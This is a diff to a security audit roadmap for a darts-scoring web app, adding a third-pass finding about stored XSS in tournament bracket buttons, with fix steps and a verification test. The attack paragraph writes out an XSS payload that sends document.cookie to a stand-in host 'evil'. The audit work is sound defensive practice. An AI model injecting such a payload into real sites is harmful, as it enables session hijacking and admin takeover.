@@ -1,11 +1,15 @@
 # Security Audit Roadmap (adversarial whole-codebase review)
 
-> **Status: ✅ All findings fixed (SEC-1 through SEC-14).** A second-pass audit
-> (2026-07, after the Cricket / Doubles Practice / Just Chuckin' It / Ghost-mode
-> expansion) opened three new findings — SEC-12 (stored XSS), SEC-13 (player-name
-> bounds), SEC-14 (validate/bound write inputs) — see "Part 4" below for what
-> shipped for each, and `docs/bug-roadmap.md` for the functional-defect
-> counterparts (BUG-1/BUG-2/BUG-3) fixed in the same pass.
+> **Status: SEC-1 through SEC-14 fixed; SEC-15 OPEN (found 2026-07, third-pass
+> audit after the single-elimination tournament feature landed).** A second-pass
+> audit (2026-07, after the Cricket / Doubles Practice / Just Chuckin' It /
+> Ghost-mode expansion) opened three findings — SEC-12 (stored XSS), SEC-13
+> (player-name bounds), SEC-14 (validate/bound write inputs), all now fixed — see
+> "Part 4" below. A **third-pass audit** (2026-07, scoped to the newly-added
+> tournament mode plus a re-check of the SEC-12 "zero bare `escapeJs`" invariant)
+> opened **SEC-15** — see "Part 5" at the bottom. Functional-defect counterparts
+> live in `docs/bug-roadmap.md` (BUG-1/BUG-2/BUG-3 from the second pass; BUG-4/BUG-5
+> from the third).
 >
 > See the "Status" line
 > under each finding below for what actually shipped, which in a couple of places is
@@ -726,3 +730,111 @@ Reaffirming it here so a future reader doesn't mistake the opt-out for an oversi
 
 **Every finding in Part 4 is now closed**, alongside `docs/bug-roadmap.md`'s
 BUG-1/BUG-2/BUG-3 (fixed in the same pass — see that doc).
+
+---
+
+## Part 5 — Third-pass audit (2026-07, after the single-elimination tournament feature)
+
+A fresh adversarial read scoped to the newly-added tournament mode (`db.js`'s
+tournament section, the `/api/tournaments*` routes in `server.js`, and the
+tournament UI in `frontend/index.html`), plus a re-check of the invariants the
+earlier passes established. The SQLi / auth-primitive / path-traversal / CSRF /
+SSRF-egress surfaces were re-checked against the new code and remain safe (all
+tournament SQL is parameterized; the only interpolated identifier in
+`_advanceTournamentMatch` is a hardcoded `'player1_id'`/`'player2_id'` column name
+chosen by a `=== 1` test, never user input; tournament routes reuse the same
+`requireWrite` gate and add no new outbound requests or credentials). One new
+finding, plus its two functional-defect counterparts in `docs/bug-roadmap.md`
+(BUG-4, BUG-5).
+
+### SEC-15 — Stored XSS via a player name in the tournament bracket view  **(MED, unauthenticated in the default-off config)**
+
+**Status: ⛔ OPEN.** This is a re-introduction of the exact SEC-12 pattern in code
+written after SEC-12 was closed — the tournament UI, added in the single-elim
+feature, interpolates player names into **double-quoted** `onclick="..."` attributes
+using **`escapeJs(name)` only**, without the outer `escapeHtml` that SEC-12
+established as this file's mandatory pattern. The SEC-12 fix's "there should be zero
+bare `escapeJs`" invariant has drifted.
+
+**Where:** `frontend/index.html`, three sinks, all rendering tournament participant
+names into an `onclick` attribute:
+
+- `renderTournamentDetail()` — the "Up Next" list's Walkover button:
+  ```js
+  onclick="askTournamentWalkover(${m.id}, '${escapeJs(m.player1Name)}', '${escapeJs(m.player2Name)}')"
+  ```
+- `askTournamentWalkover()` — the two winner-choice buttons in its confirm modal:
+  ```js
+  onclick="submitTournamentWalkover(${matchId}, '${escapeJs(p1)}')"   // and p2
+  ```
+
+`escapeJs()` escapes `\` and `'` but **not** `"`, `<`, or `>`. The visible button
+*text* at each site correctly uses `escapeHtml(...)`; only the `onclick` attribute is
+unescaped — the same asymmetry SEC-12 had.
+
+**Attack:** identical mechanism and impact to SEC-12. Player names have a permissive
+charset server-side (SEC-13 bounds only length and control characters — `"`/`<`/`>`
+are all allowed). With `OCHE_REQUIRE_AUTH=false` (the open-LAN opt-out), anyone can
+`POST /api/players` with a name like:
+
+```
+x"><img src=x onerror=fetch('//evil/'+document.cookie)>
+```
+
+then `POST /api/tournaments` including that name in `players[]` (both public writes
+when auth is off). Any round-1 match with two known players is immediately `ready`, so
+the poisoned name renders in the "Up Next" Walkover button. When an admin opens that
+tournament's detail view, the un-escaped `"` closes the `onclick`, `>` closes the
+`<button>`, and the injected `<img onerror>` runs **in the admin's authenticated
+session** — no click required. The session cookie is `HttpOnly`, but the injected
+script can call any admin API (create an admin, change a password, wipe data, or
+forge the tournament-advancement call that BUG-4 leaves unguarded) using the admin's
+ambient session. Anonymous → admin escalation, exactly as SEC-12. Under the zero-trust
+default (`OCHE_REQUIRE_AUTH=true`) only admins create players/tournaments, narrowing
+the cross-privilege angle, but a name could have been planted before auth was enabled
+or under the `false` opt-out, so the fix is defense-in-depth regardless.
+
+**Fix (step by step):**
+1. In `renderTournamentDetail()` and `askTournamentWalkover()`, change all three sinks
+   to the file's established pattern: `escapeHtml(escapeJs(name))` (e.g.
+   `onclick="askTournamentWalkover(${m.id}, '${escapeHtml(escapeJs(m.player1Name))}', '${escapeHtml(escapeJs(m.player2Name))}')"`).
+   Nothing else changes — the display text already uses `escapeHtml`.
+2. **Same-class defense-in-depth cleanup** (BUG-3 precedent): `renderBackups()`'s
+   three backup-name handlers (`downloadBackup`/`askRestoreBackup`/`askDeleteBackup`)
+   also use bare `escapeJs`. They are **not** exploitable today — backup filenames are
+   server-generated and `listBackups()` filters them through
+   `BACKUP_NAME_RE = /^darts-[0-9TZ.-]+\.db$/`, a charset with no `"`/`<`/`>` — but
+   they're the same "safe only because a validator elsewhere constrains the input"
+   coupling SEC-12/BUG-3 flagged, and admin-only. Wrap them in
+   `escapeHtml(escapeJs(...))` too so the whole file is consistent again.
+3. Re-establish the invariant as a guard: a grep for `escapeJs(` **not** immediately
+   preceded by `escapeHtml(` across `frontend/index.html` should return **zero**
+   matches (today it returns the three tournament sinks, the three backup sinks, and
+   the `escapeJs` definition itself — after this fix, only the definition).
+
+**Verify:** create a player named `x"><img src=x onerror=window.__xss=true>`, add it to
+a tournament, open the tournament's detail view, and confirm `window.__xss` stays
+`false`, no image request fires, and the name renders as literal escaped text in both
+the Walkover button's `onclick` and the confirm-modal buttons.
+
+---
+
+### Residual risk note (tournament, auth-off)
+
+The tournament write endpoints (`POST /api/tournaments`, `.../start`, `.../walkover`)
+extend the same documented auth-off residual as every other write: under
+`OCHE_REQUIRE_AUTH=false`, an anonymous LAN client can create tournaments (which
+auto-creates any novel player names via `ensurePlayer`, up to 128 per tournament) and
+drive their matches, spamming rows. This is the already-documented open-LAN tradeoff
+(see "Residual risk reaffirmed" in Part 4), not a new finding — the mitigation is the
+zero-trust default plus the SEC-3 global rate limiter. Reaffirmed here only so a reader
+auditing the new endpoints doesn't mistake it for an oversight.
+
+## Suggested order for Part 5
+
+1. **SEC-15** (XSS) — real, cheap, and it also removes the delivery vehicle for
+   exploiting BUG-4 through an admin session. Do it first. Pair the fix with a
+   re-assertion of the "zero bare `escapeJs`" grep invariant so this doesn't drift a
+   third time.
+2. Then `docs/bug-roadmap.md` **BUG-4** (tournament advancement validation) and
+   **BUG-5** (legs/sets bounds) — data-integrity hardening on the same feature.
